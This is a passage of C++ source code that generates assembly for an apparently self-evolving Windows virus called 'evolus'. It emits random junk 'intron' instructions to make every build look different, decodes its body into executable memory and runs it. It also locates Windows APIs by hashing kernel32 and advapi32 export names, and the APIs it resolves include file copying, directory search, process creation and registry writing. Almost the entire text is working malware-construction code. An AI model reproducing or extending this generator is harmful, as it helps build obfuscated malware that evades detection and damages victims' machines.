        file << ""        _sub0001        ; BC1=0xFFFFFFFF"" << endl; CreateAnIntron();
        file << ""        _xor            ; BC1=0xFFFFFFFF XOR BC2"" << endl; CreateAnIntron();
        file << ""        _add0001        ; BC1=-BC2"" << endl; CreateAnIntron();
        file << ""        _save           ; BC2=-BC2"" << endl; CreateAnIntron();
        file << ""        _pop            ; restore BC1"" << endl; CreateAnIntron();
        file << ""        _addsaved       ; BC1=BC1+(-BC2)"" << endl; CreateAnIntron();

    if (rr!=0)
    {
        CreateAnIntron();
        nopdC(); CreateAnIntron();
        file << ""        _popall"" << endl; CreateAnIntron();
        nopsC(); CreateAnIntron();
        file << ""        _pushall        ; Restore ZF"" << endl; CreateAnIntron();
        file << ""        _save"" << endl; CreateAnIntron();
        file << ""        _and"" << endl; CreateAnIntron();
        file << ""        _popall"" << endl; CreateAnIntron();        
    }
}



vector<string> RemoveElement(vector<string> *List, string Element)
{
    if (Element!="""")
    {
        List->push_back("""");
        for (vector<string>::iterator i=List->begin(); i!=List->end(); ++i)
        {
            if ((*i)==Element) { List->erase(i); }
        }
        List->erase(List->end());
    }
    return(*List);
}

#define TranslatorIntron 2
int cIntronN;
void CreateIntronTranslator(bool wFlags=0, string El1="""", string El2="""", string El3="""", string El4="""", string El5="""", string El6="""", string El7="""", string El8="""")
{
//    cout << wFlags << wEAX << wEBX << wECX << wEDX << wEBP << wESI << wEDI << endl << ""- - -"" << endl;
    vector<string> AllReg;
    AllReg.push_back(""EAX""); AllReg.push_back(""EBX""); AllReg.push_back(""ECX""); AllReg.push_back(""EDX"");
    AllReg.push_back(""EDI""); AllReg.push_back(""ESI""); AllReg.push_back(""EBP""); AllReg.push_back(""ESP"");
    
    vector<string> UnUsedReg;
    UnUsedReg.push_back(""EAX""); UnUsedReg.push_back(""EBX""); UnUsedReg.push_back(""ECX""); UnUsedReg.push_back(""EDX"");
    UnUsedReg.push_back(""EDI""); UnUsedReg.push_back(""ESI""); UnUsedReg.push_back(""EBP"");
    UnUsedReg=RemoveElement(&UnUsedReg,El1);
    UnUsedReg=RemoveElement(&UnUsedReg,El2);
    UnUsedReg=RemoveElement(&UnUsedReg,El3);
    UnUsedReg=RemoveElement(&UnUsedReg,El4);
    UnUsedReg=RemoveElement(&UnUsedReg,El5);
    UnUsedReg=RemoveElement(&UnUsedReg,El6);
    UnUsedReg=RemoveElement(&UnUsedReg,El7);
    UnUsedReg=RemoveElement(&UnUsedReg,El8);                            
        
    vector<string> ArithOp2Arg;
    ArithOp2Arg.push_back(""add"");
    ArithOp2Arg.push_back(""sub"");
    ArithOp2Arg.push_back(""xor"");
    ArithOp2Arg.push_back(""and"");
    ArithOp2Arg.push_back(""or"");
    ArithOp2Arg.push_back(""cmp"");
    ArithOp2Arg.push_back(""test""); 
    
    vector<string> ArithOp1Arg;
    ArithOp1Arg.push_back(""inc"");
    ArithOp1Arg.push_back(""dec"");

    vector<string> ShiftVec;    
    ShiftVec.push_back(""shr"");
    ShiftVec.push_back(""shl"");    
       
    
    if (!(rand()%TranslatorIntron))
    {
        cIntronN++;

        if (wFlags)
        {
            while (rand()%13)
            {
                int rr=rand()%8;
                if (rr<3)  { file << ""nop"" << endl; }
                if (rr==4) { file << ""mov ""  << UnUsedReg[rand()%UnUsedReg.size()] << "","" << AllReg[rand()%AllReg.size()] << endl; }
                if (rr==5) { file << ""mov ""  << UnUsedReg[rand()%UnUsedReg.size()] << "","" << rand() << endl; }                                
                if (rr==6) { file << ""xchg "" << UnUsedReg[rand()%UnUsedReg.size()] << "","" << UnUsedReg[rand()%UnUsedReg.size()] << endl; }
                if (rr==7) { file << ""push "" << AllReg[rand()%AllReg.size()] << endl << ""pop "" << UnUsedReg[rand()%UnUsedReg.size()] << endl; }
                if (rr==8) { file << ""push "" << rand() << endl << ""pop "" << UnUsedReg[rand()%UnUsedReg.size()] << endl; }                
            }
        }
        else
        {
            while (rand()%13)
            {
                int rr=rand()%25;                           
                if (rr<3)  { file << ""nop"" << endl; }
                if (rr==4) { file << ""mov ""  << UnUsedReg[rand()%(UnUsedReg.size())] << "","" << AllReg[rand()%(AllReg.size())] << endl; }
                if (rr==5) { file << ""mov ""  << UnUsedReg[rand()%(UnUsedReg.size())] << "","" << rand() << endl; }                
                if (rr==6) { file << ""xchg "" << UnUsedReg[rand()%(UnUsedReg.size())] << "","" << UnUsedReg[rand()%(UnUsedReg.size())] << endl; }
                if (rr==7) { file << ""push "" << AllReg[rand()%(AllReg.size())] << endl << ""pop "" << UnUsedReg[rand()%(UnUsedReg.size())] << endl; }
                if (rr==8) { file << ""push "" << rand() << endl << ""pop "" << UnUsedReg[rand()%(UnUsedReg.size())] << endl; }                   
                if (rr>8 && rr<=13)  { file << ArithOp2Arg[rand()%ArithOp2Arg.size()] << "" "" << UnUsedReg[rand()%UnUsedReg.size()] << "","" << AllReg[rand()%AllReg.size()] << endl; }
                if (rr>13 && rr<=16) { file << ArithOp2Arg[rand()%ArithOp2Arg.size()] << "" "" << UnUsedReg[rand()%UnUsedReg.size()] << "","" << rand() << endl; }
                if (rr>16 && rr<=20) { file << ArithOp1Arg[rand()%ArithOp1Arg.size()] << "" "" << UnUsedReg[rand()%UnUsedReg.size()] << endl; } 
                if (rr>20 && rr<=23) { file << ShiftVec[rand()%ShiftVec.size()] << "" "" << UnUsedReg[rand()%UnUsedReg.size()] << "", "" << rand()%(0x100) << endl; } 
                if (rr>23) { file << ShiftVec[rand()%ShiftVec.size()] << "" "" << UnUsedReg[rand()%UnUsedReg.size()] << "", cl"" <<  endl; }                        
            }
        }
    }
}


void ZeroRegister(string Reg)
{
    int rr=rand()%4;
    if (rr==0)
    {
        file << ""mov "" << Reg << "",0"" << endl;
    }
    if (rr==1)
    {
        file << ""xor "" << Reg << "","" << Reg << endl;
    }
    if (rr==2)
    {
        file << ""sub "" << Reg << "","" << Reg << endl;
    } 
    if (rr==3)
    {
        file << ""push 0"" << endl << ""pop "" << Reg << endl;
    }
}


void MovRegNum(string Reg, int Num)
{
    int rr=rand()%5;
    if (rr==0)
    {
        file << ""mov ""<< Reg << "","" << Num << endl; 
    }
    if (rr==1)
    {
        ZeroRegister(Reg);
        file << ""add ""<< Reg << "","" << Num << endl; 
    }
    if (rr==2)
    {
        ZeroRegister(Reg);
        file << ""sub ""<< Reg << "",-"" << Num << endl; 
    }
    if (rr==3)
    {
        ZeroRegister(Reg);
        file << ""xor ""<< Reg << "","" << Num << endl; 
    } 
    if (rr==4)
    {
        ZeroRegister(Reg);
        file << ""or ""<< Reg << "","" << Num << endl; 
    }
}

void Lea(string Reg, string Address, string Num)
{
    int rr=rand()%2;
    if (rr==0)
    {
        file << ""mov ""<< Reg << "","" << Address << endl; 
        file << ""add ""<< Reg << "","" << Num << endl;
    }
    if (rr==1)
    {
        ZeroRegister(Reg);
        file << ""lea ""<< Reg << "",["" << Address << ""+"" << Num << ""]"" << endl; 
    }
}

int main()
{
    // Get the list of process identifiers.
    cout << ""\nCreate evolus with introns\n"" << endl;
    cout <<   ""**************************\n\n"" << endl;
IntronSTST=0;
IntronNOP=0;
cIntronN=0;
    srand ( time(NULL) );


    file.open(""evolus.asm"");

    vector<string> UseReg;
    UseReg.push_back(""EAX""); UseReg.push_back(""EBX""); UseReg.push_back(""EDX"");
    
    string SplicSepX=UseReg[rand()%UseReg.size()]; string SplicSepL=SplicSepX.substr(1,1)+""L""; UseReg=RemoveElement(&UseReg,SplicSepX);
//    cout << ""SplicSepX: "" << SplicSepX << endl;    
    
    UseReg.push_back(""ECX""); 
    string CodonContX=UseReg[rand()%UseReg.size()]; string CodonContL=CodonContX.substr(1,1)+""L""; UseReg=RemoveElement(&UseReg,CodonContX);
//    cout << ""CodonContX: "" << CodonContX << endl;
    
    UseReg.push_back(""EBP""); UseReg=RemoveElement(&UseReg,""ECX"");
    string CodonCount=UseReg[rand()%UseReg.size()]; UseReg=RemoveElement(&UseReg,CodonCount);   
//    cout << ""CodonCount: "" << CodonCount << endl;   
    
    UseReg.push_back(CodonContX); UseReg.push_back(""ECX""); 
    string TmpReg=UseReg[rand()%UseReg.size()];    
//    cout << ""TmpReg: "" << TmpReg << endl;       
//    cin.get(); 
    

file << ""include "" << static_cast<char>(39) << ""E:"" << static_cast<char>(92) << ""Programme"" << static_cast<char>(92) << ""FASM"" << static_cast<char>(92) << ""INCLUDE"" << static_cast<char>(92) << ""win32ax.inc"" << static_cast<char>(39) << """" << endl;
file << """" << endl;
file << ""RndNum = %t AND 0xFFFF"" << static_cast<char>(39) << ""FFFF"" << endl;
file << ""macro GetNewRandomNumber"" << endl;
file << ""{"" << endl;
file << ""    RndNum = ((RndNum*214013+2531011) AND 0xFFFF"" << static_cast<char>(39) << ""FFFF)"" << endl;
file << ""}"" << endl;
file << """" << endl;
file << "".data"" << endl;
file << ""       include "" << static_cast<char>(39) << ""data_n_equs.inc"" << static_cast<char>(39) << """" << endl;
file << "";        a db "" << static_cast<char>(34) << ""Am I allowed to live?"" << static_cast<char>(34) << "",0x0"" << endl;
file << "";        b db "" << static_cast<char>(34) << ""In evolution we trust"" << static_cast<char>(34) << "",0x0"" << endl;
file << """" << endl;
file << """" << endl;
file << "".code"" << endl;
file << ""start:"" << endl;
while(rand()%11){ CreateIntronTranslator(); }
file << """" << endl; CreateIntronTranslator();
file << ""       AlignedSize=0x1"" << static_cast<char>(39) << ""0000"" << endl;
file << ""       while ((EndAmino-StAmino)*8)>AlignedSize"" << endl;
file << ""           AlignedSize=AlignedSize+0x1"" << static_cast<char>(39) << ""0000"" << endl;
file << ""       end while"" << endl;
file << """" << endl; CreateIntronTranslator();
file << "" push PAGE_EXECUTE_READWRITE"" << endl; CreateIntronTranslator();
file << "" push 0x1000"" << endl;CreateIntronTranslator();
file << "" push AlignedSize"" << endl; CreateIntronTranslator();
file << "" push 0x0"" << endl; CreateIntronTranslator();
file << "" stdcall [VirtualAlloc]"" << endl; CreateIntronTranslator(0, ""EAX"");
file << ""       mov     [Place4Life], eax"" << endl; CreateIntronTranslator();
ZeroRegister(SplicSepX); CreateIntronTranslator(0, SplicSepX);
ZeroRegister(CodonCount); CreateIntronTranslator(0, SplicSepX, CodonCount);
file << ""       WriteMoreToMemory:"" << endl; CreateIntronTranslator(0, SplicSepX, CodonCount);
ZeroRegister(CodonContX); CreateIntronTranslator(0, SplicSepX, CodonCount, CodonContX);
file << ""               mov     "" << CodonContL << "", byte["" << CodonCount << ""+StAmino]"" << endl; CreateIntronTranslator(0, SplicSepX, CodonCount, CodonContX);
file << ""               cmp     "" << CodonContL << "", StartCodon "" << endl; CreateIntronTranslator(1, SplicSepX, CodonCount, CodonContX);
file << ""               jne     SplicingNoStart"" << endl; CreateIntronTranslator(0, SplicSepX, CodonCount, CodonContX);
ZeroRegister(SplicSepX); CreateIntronTranslator(0, SplicSepX, CodonCount, CodonContX);
file << ""               SplicingNoStart:"" << endl; CreateIntronTranslator(0, SplicSepX, CodonCount, CodonContX);
file << ""               cmp     "" << CodonContL << "", StopCodon"" << endl; CreateIntronTranslator(1, SplicSepX, CodonCount, CodonContX);
file << ""               jne     SplicingNoStop"" << endl; CreateIntronTranslator(0, SplicSepX, CodonCount, CodonContX);
MovRegNum(SplicSepX, 0x91); CreateIntronTranslator(0, SplicSepX, CodonCount, CodonContX);
file << ""               SplicingNoStop:"" << endl; CreateIntronTranslator(0, SplicSepX, CodonCount, CodonContX);
file << ""               or      "" << CodonContL << "", "" << SplicSepL <<  endl; CreateIntronTranslator(0, SplicSepX, CodonCount, CodonContX);
file << ""               shl     "" << CodonContX << "", 3"" << endl; CreateIntronTranslator(0, SplicSepX, CodonCount, CodonContX);
Lea(""ESI"", ""StartAlphabeth"", CodonContX);
file << ""               mov     "" << TmpReg << "","" << CodonCount << endl; CreateIntronTranslator(0, SplicSepX, CodonCount, TmpReg, ""ESI"");
file << ""               shl     "" << TmpReg << "", 3"" << endl; CreateIntronTranslator(0, SplicSepX, CodonCount, TmpReg, ""ESI"");
file << ""               mov     edi, [Place4Life]"" << endl; CreateIntronTranslator(0, SplicSepX, CodonCount, TmpReg, ""ESI"", ""EDI"");
file << ""               add     edi, "" << TmpReg << endl; CreateIntronTranslator(0, SplicSepX, CodonCount, ""ESI"", ""EDI"");
MovRegNum(""ECX"", 8); CreateIntronTranslator(0, SplicSepX, CodonCount, ""ESI"", ""EDI"", ""ECX"");
file << ""               rep     movsb"" << endl; CreateIntronTranslator(0, SplicSepX, CodonCount);
file << ""               inc     "" << CodonCount << endl;  CreateIntronTranslator(0, SplicSepX, CodonCount);
file << ""       cmp     "" << CodonCount << "", (EndAmino-StAmino)"" << endl;  CreateIntronTranslator(1, SplicSepX, CodonCount);
file << ""       jne     WriteMoreToMemory"" << endl; CreateIntronTranslator();
while(rand()%11){ CreateIntronTranslator(); }
file << ""       call    [Place4Life]                            ; Lets start!!!"" << endl; CreateIntronTranslator();
file << """" << endl;
while(rand()%11){ CreateIntronTranslator(); }
file << """" << endl;
file << """" << endl;
file << """" << endl;
file << ""; ##################################################################"" << endl;
file << ""; Alphabeth"" << endl;
file << ""StartAlphabeth:"" << endl;
file << ""include "" << static_cast<char>(39) << ""alphabeth.inc"" << static_cast<char>(39) << """" << endl;
file << ""CreateAlphabet"" << endl;
file << """" << endl;
file << ""EndAlphabeth:"" << endl;
file << """" << endl;
file << ""; ##################################################################"" << endl;
file << """" << endl;
//file << ""include "" << static_cast<char>(39) << ""instruction_set_macros.inc"" << static_cast<char>(39) << """" << endl;
file << """" << endl;
file << ""; ##################################################################"" << endl;
file << ""; Amino Acids"" << endl;
for (int i=0; i<500; i++) { CreateAnIntron(); }
file << ""StAmino:"" << endl;
for (int i=0; i<500; i++) { CreateAnIntron(); }
file << """" << endl;
file << ""; ############################################################################"" << endl;
file << ""; ############################################################################"" << endl;
file << ""; ############################################################################"" << endl;
file << ""; #####"" << endl;
file << ""; #####  Here the genom gets the Addresses of the Windows APIs."" << endl;
file << ""; #####  It loads via LoadLibrary the kernel32.dll and advapi32.dll,"" << endl;
file << ""; #####  searchs in the Export Table for the adequade API (creating"" << endl;
file << ""; #####  an internal 12 bit checksum, and compares it with some hardcoded"" << endl;
file << ""; #####  12bit values). This procedere should be evolvable."" << endl;
file << ""; #####"" << endl;
file << ""; #####  Optimum would have been to call the Windows APIs by its"" << endl;
file << ""; #####  Ordinal Numbers, but they change at every release of Windows."" << endl;
file << ""; #####"" << endl;
file << ""; #####  At Linux, evolvable API calls are already presented, as you"" << endl;
file << ""; #####  call int 0x80 with a specific number in eax which represents"" << endl;
file << ""; #####  the API number."" << endl;
file << ""; #####"" << endl;
file << ""; #####"" << endl;
file << "";"" << endl;
file << ""; The Hash-Algo is equivalent to:"" << endl;
file << ""; ==============================="" << endl;
file << "";"" << endl;
file << "";;FindAPIGiveMeTheHash:"" << endl;
file << "";; In: ebx=pointer to API name"" << endl;
file << "";; Out: eax=Hash   (in ax)"" << endl;
file << "";; changed: eax"" << endl;
file << "";;        mov     ebx, apistr"" << endl;
file << "";"" << endl;
file << "";        push    ebx"" << endl;
file << "";        push    ecx"" << endl;
file << "";        push    edx"" << endl;
file << "";        xor     eax, eax"" << endl;
file << "";        xor     ecx, ecx"" << endl;
file << "";        dec     ebx"" << endl;
file << "";        FindAPIGiveMeTheHashMore:"" << endl;
file << "";                inc     ebx"" << endl;
file << "";                mov     ecx, dword[ebx]"" << endl;
file << "";                xor     eax, ecx"" << endl;
file << "";                mov     edx, ecx        ; ecx=nooo - n ... new byte"" << endl;
file << "";                shr     edx, 8          ; edx=000n ... new byte"" << endl;
file << "";                cmp     dl, 0           ; dl=n"" << endl;
file << "";        jne     FindAPIGiveMeTheHashMore"" << endl;
file << "";"" << endl;
file << "";        and     eax, 0x0FFF"" << endl;
file << "";        pop     edx"" << endl;
file << "";        pop     ecx"" << endl;
file << "";        pop     ebx"" << endl;
file << "";ret"" << endl;
file << """" << endl;
file << """" << endl;
file << """" << endl;
file << ""StAminoAcids1:"" << endl;
file << "";        repeat 100"" << endl;
file << "";            _nopREAL"" << endl;
file << "";        end repeat"" << endl;
file << """" << endl;
file << """" << endl;
file << ""       db _START"" << endl;
file << ""       db _STOP"" << endl;
file << """" << endl;
file << ""       db _START"" << endl;
file << """" << endl;
GetAddress(""mCloseHandle"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""0x0342"");
file << ""       _writeDWord"" << endl; CreateAnIntron();
file << """" << endl;
GetAddress(""mCopyFileA"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""0x0C5C"");
file << ""       _writeDWord"" << endl; CreateAnIntron();
file << """" << endl;
GetAddress(""mCreateFileA"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""0x0615"");
file << ""       _writeDWord"" << endl; CreateAnIntron();
file << """" << endl;
GetAddress(""mCreateFileMappingA"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""0x04E1"");
file << ""       _writeDWord"" << endl; CreateAnIntron();
file << """" << endl;
GetAddress(""mCreateProcessA"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""0x0674"");
file << ""       _writeDWord"" << endl; CreateAnIntron();
file << """" << endl;
GetAddress(""mGetDriveTypeA"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""0x0AFD"");
file << ""       _writeDWord"" << endl; CreateAnIntron();
file << """" << endl;
GetAddress(""mGetCommandLineA"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""0x06A8"");
file << ""       _writeDWord"" << endl; CreateAnIntron();
file << """" << endl;
GetAddress(""mGetFileSize"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""0x083B"");
file << ""       _writeDWord"" << endl; CreateAnIntron();
file << """" << endl;
GetAddress(""mWriteFile"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""0x078B"");
file << ""       _writeDWord"" << endl; CreateAnIntron();
file << """" << endl;
GetAddress(""mGetTickCount"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""0x01B4"");
file << ""       _writeDWord"" << endl; CreateAnIntron();
file << """" << endl;
GetAddress(""mMapViewOfFile"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""0x05EE"");
file << ""       _writeDWord"" << endl; CreateAnIntron();
file << """" << endl;
GetAddress(""mSleep"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""0x07F9"");
file << ""       _writeDWord"" << endl; CreateAnIntron();
file << """" << endl;
GetAddress(""mFindFirstFileA"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""0x094A"");
file << ""       _writeDWord"" << endl; CreateAnIntron();
file << """" << endl;
GetAddress(""mFindNextFileA"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""0x0FE1"");
file << ""       _writeDWord"" << endl; CreateAnIntron();
file << """" << endl;
GetAddress(""mUnmapViewOfFile"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""0x01D1"");
file << ""       _writeDWord"" << endl; CreateAnIntron();
file << """" << endl;
GetAddress(""mSetErrorMode"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""0x0CBB"");
file << ""       _writeDWord"" << endl; CreateAnIntron();
file << """" << endl;
GetAddress(""mRegCreateKeyA"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""0x0EDC"");
file << ""       _writeDWord"" << endl; CreateAnIntron();
file << """" << endl;
GetAddress(""mRegSetValueExA"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""0x0845"");
file << ""       _writeDWord"" << endl; CreateAnIntron();
file << """" << endl;
file << """" << endl;
GetAddress(""stDLLkernel32"");
file << ""       _saveWrtOff                      ; to the data-section. This will be used"" << endl; CreateAnIntron();
file << ""       _nopdA                           ; by LoadLibraryA as argument later"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'kern\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();
file << """" << endl;
file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
file << ""       _nopdA"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'el32\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();
file << """" << endl;
file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
file << ""       _nopdA"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'.dll\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

GetAddress(""stDLLadvapi32"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
file << ""       _nopdA"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'adva\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
file << ""       _nopdA"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'pi32\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
file << ""       _nopdA"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'.dll\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();


GetAddress(""stDLLkernel32"");
file << ""       _push"" << endl; CreateAnIntron();
file << ""       _CallAPILoadLibrary      ; invoke LoadLibrary, "" << static_cast<char>(34) << ""kernel32.dll"" << static_cast<char>(34) << """" << endl; CreateAnIntron();

GetAddress(""hDLLlibrary32"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();


file << ""       _nopsA"" << endl; CreateAnIntron();
file << ""       _writeDWord              ; mov dword[hDLLkernel32], eax"" << endl; CreateAnIntron();

file << ""       _save                    ; Save kernel32.dll position"" << endl; CreateAnIntron();
addnumber(""0x3C"");
file << ""       _getdata                 ; mov RegB, dword[hDLLkernel32+0x3C]"" << endl; CreateAnIntron();
file << ""                                ; = Pointer to PE Header of kernel32.dll"" << endl; CreateAnIntron();
file << ""       _addsaved                ; relative -> absolut"" << endl; CreateAnIntron();

addnumber(""0x78"");
file << ""       _getdata                 ; Export Tables"" << endl; CreateAnIntron();
file << ""       _addsaved                ; relative -> absolut"" << endl; CreateAnIntron();
addnumber(""0x1C"");

file << ""       _nopdA                   ; temporarily save Offset of Addresse Table in RegA"" << endl; CreateAnIntron();

GetAddress(""hAddressTable"");
file << ""       _saveWrtOff              ; WriteOffset=hAddressTable"" << endl; CreateAnIntron();

file << ""       _nopsA                   ; restore RegA=Addresse Tables"" << endl; CreateAnIntron();
file << ""       _getdata                 ; Pointer To Addresse Table"" << endl; CreateAnIntron();
file << ""       _addsaved                ; relative -> absolut"" << endl; CreateAnIntron();
file << ""       _writeDWord              ; mov dword[hAddressTable], (Pointer to Addresse Table)"" << endl; CreateAnIntron();

GetAddress(""hNamePointerTable"");
file << ""       _saveWrtOff              ; WriteOffset=hNamePointerTable"" << endl; CreateAnIntron();

file << ""       _nopsA                   ; BC1=Addresse Table"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();

file << ""       _getdata                 ; Pointer To Name Table"" << endl; CreateAnIntron();
file << ""       _addsaved                ; relative -> absolut"" << endl; CreateAnIntron();
file << ""       _writeDWord              ; mov dword[hNamePointerTable], (Pointer to Name Pointer Table)"" << endl; CreateAnIntron();

GetAddress(""hOrdinalTable"");
file << ""       _saveWrtOff              ; WriteOffset=hOrdinalTable"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");

file << ""       _getdata                 ; Ordinal Table"" << endl; CreateAnIntron();
file << ""       _addsaved                ; relative -> absolut"" << endl; CreateAnIntron();
file << ""       _writeDWord              ; mov dword[hOrdinalTable], (Pointer to Ordinal Table)"" << endl; CreateAnIntron();



GetAddress(""APINumber"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(1);
addnumber(""APINumberKernel"");
file << ""       _writeDWord              ; Save number of kernel32.dll APIs"" << endl; CreateAnIntron();


GetAddress(""hAddressePointer"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
GetAddress(""APIAddresses"");
file << ""       _writeDWord      ; Saves the AddressePointer"" << endl; CreateAnIntron();


GetAddress(""hMagicNumberPointer"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
GetAddress(""APIMagicNumbersKernel"");
file << ""       _writeDWord      ; Saves the MagicNumber Pointer"" << endl; CreateAnIntron();

zer0(0);
addnumber(""43"");
file << ""       _push"" << endl; CreateAnIntron();

file << ""; FindAllAPIs"" << endl; CreateAnIntron();
file << ""       _getEIP"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _saveJmpOff      ; mov BA2, eip  - for further API searching in different DLLs"" << endl; CreateAnIntron();

file << ""       _pushall"" << endl; CreateAnIntron();

zer0(0);
file << ""               _nopdB          ; RegB = Counter for first instance loop = 0"" << endl; CreateAnIntron();

GetAddress(""hAddressePointer"");
file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _nopdA           ; RegA = Pointer to Buffer for API Addresse"" << endl; CreateAnIntron();

GetAddress(""hMagicNumberPointer"");
file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _nopdD           ; RegD = Pointer to Magic Numbers for APIs"" << endl; CreateAnIntron();



file << ""           ; FindAllAPIsNext"" << endl; CreateAnIntron();
file << ""               _getEIP"" << endl; CreateAnIntron();
file << ""               _sub0001"" << endl; CreateAnIntron();
file << ""               _sub0001"" << endl; CreateAnIntron();
file << ""               _sub0001"" << endl; CreateAnIntron();
file << ""               _sub0001"" << endl; CreateAnIntron();
file << ""               _sub0001"" << endl; CreateAnIntron();
file << ""               _saveJmpOff      ; mov BA2, eip"" << endl; CreateAnIntron();


file << ""               _pushall"" << endl; CreateAnIntron();
file << ""                       ; RegA=free  | used for pointer within the Name Pointer Table"" << endl; CreateAnIntron();
file << ""                       ; RegB=free  | used as temporary buffer"" << endl; CreateAnIntron();
file << ""                       ; RegD=MagicNumber for API"" << endl; CreateAnIntron();
file << ""                       ; Stack:  | counter (number of APIs checked in kernel32.dll)"" << endl; CreateAnIntron();

GetAddress(""hNamePointerTable"");
file << ""                       _getdata"" << endl; CreateAnIntron();
file << ""                       _nopdA               ; Pointer to Name Pointer Table (points to first API)"" << endl; CreateAnIntron();

zer0(0);
file << ""                       _sub0001"" << endl; CreateAnIntron();
file << ""                       _push                ; counter"" << endl; CreateAnIntron();

file << ""                  ; SearchNextAPI:"" << endl; CreateAnIntron();
file << ""                       _getEIP"" << endl; CreateAnIntron();
file << ""                       _sub0001"" << endl; CreateAnIntron();
file << ""                       _sub0001"" << endl; CreateAnIntron();
file << ""                       _sub0001"" << endl; CreateAnIntron();
file << ""                       _sub0001"" << endl; CreateAnIntron();
file << ""                       _sub0001"" << endl; CreateAnIntron();
file << ""                       _saveJmpOff          ; mov BA2, eip"" << endl; CreateAnIntron();

file << ""                       _pop"" << endl; CreateAnIntron();
addnumber(""0x1"");
file << ""                       _push"" << endl; CreateAnIntron();

GetAddress(""hDLLlibrary32"");
file << ""                       _getdata"" << endl; CreateAnIntron();
file << ""                       _save                ; kernel32.dll position"" << endl; CreateAnIntron();

file << ""                       _nopsA               ; Pointer to NamePointerTable"" << endl; CreateAnIntron();
file << ""                       _getdata             ; Points to API name"" << endl; CreateAnIntron();
file << ""                       _addsaved            ; relative -> absolut"" << endl; CreateAnIntron();
file << ""                       _sub0001             ; -- (for algorithm)"" << endl; CreateAnIntron();
file << ""                       _nopdB              ; save Pointer to API name"" << endl; CreateAnIntron();


file << ""                       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""                       _nopdA               ; Has just effects in next loop"" << endl; CreateAnIntron();

file << ""                       _pushall"" << endl; CreateAnIntron();
zer0(0);
file << ""                               _nopdA"" << endl; CreateAnIntron();

file << ""                               _getEIP"" << endl; CreateAnIntron();
file << ""                               _sub0001"" << endl; CreateAnIntron();
file << ""                               _sub0001"" << endl; CreateAnIntron();
file << ""                               _sub0001"" << endl; CreateAnIntron();
file << ""                               _sub0001"" << endl; CreateAnIntron();
file << ""                               _sub0001"" << endl; CreateAnIntron();
file << ""                               _saveJmpOff          ; mov BA2, eip"" << endl; CreateAnIntron();

file << ""                               _nopsA"" << endl; CreateAnIntron();
file << ""                               _save                ; RegA=MagicNumber"" << endl; CreateAnIntron();

file << ""                               _nopsB"" << endl; CreateAnIntron();
addnumber(""1"");
file << ""                               _nopdB              ; BC1=NamePointer++"" << endl; CreateAnIntron();

file << ""                               _getdata             ; BC1=dword[NamePointer+n]"" << endl; CreateAnIntron();

file << ""                               _addsaved            ; BC1=BC1 + BC2 = dword[NamePointer+n] xor MagicNumber"" << endl; CreateAnIntron();
file << ""                               _nopdA"" << endl; CreateAnIntron();

zer0(0);
addnumber(""8"");
file << ""                               _save"" << endl; CreateAnIntron();

file << ""                               _nopsB"" << endl; CreateAnIntron();
file << ""                               _getdata             ; BC1=nxxx"" << endl; CreateAnIntron();
file << ""                               _shr                 ; BC1=???n"" << endl; CreateAnIntron();
